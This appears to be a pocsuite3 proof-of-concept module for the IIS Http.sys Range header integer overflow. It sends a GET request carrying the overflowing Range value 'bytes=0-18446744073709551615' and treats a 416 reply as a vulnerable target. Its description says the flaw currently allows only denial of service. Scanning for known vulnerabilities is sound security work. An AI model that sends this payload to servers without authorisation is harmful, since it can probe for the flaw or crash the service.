#!/usr/bin/env python
#_*_ encoding: utf-8 _*_

from pocsuite3.api import Output, POCBase, register_poc, requests

class IISHttpSys(POCBase):
    vulID = '89233'
    version = '1.0'
    author = ['big04dream']
    vulDate = '2015-07-01'
    createDate = '2019-10-11'
    updateDate = '2019-10-11'
    references = ['https://www.seebug.org/vuldb/ssvid-89233']
    name = 'Http.sys Remote Code Execution'
    appPowerLink = 'https://www.microsoft.com'
    appName = 'IIS'
    appVersion = 'all'
    vulType = 'rce'
    desc = '''
    IIS 系列 Http.sys 处理 Range 整数溢出漏洞, 目前只能DOS
    '''
    
    def _verify(self):
        result = {}
        try:
            url = self.url
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 Firefox/32.0", 
                "Accept-Encoding": "gzip, deflate",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Range": "bytes=0-18446744073709551615",
                "Referer": "https://github.com/whoadmin/", 
                "Connection": "keep-alive"
            }
            response = requests.get(url, headers=headers, verify=False, timeout=5)
            if response.status_code == 416 or 'Requested Range Not Satisfiable' in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Payload'] = "bytes=0-18446744073709551615"
        except:
            pass
        return self.parse_output(result)
    
    def _attack(self):
        return self._verify()
    
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not http.sys vulnerability')
        return output
    
register_poc(IISHttpSys)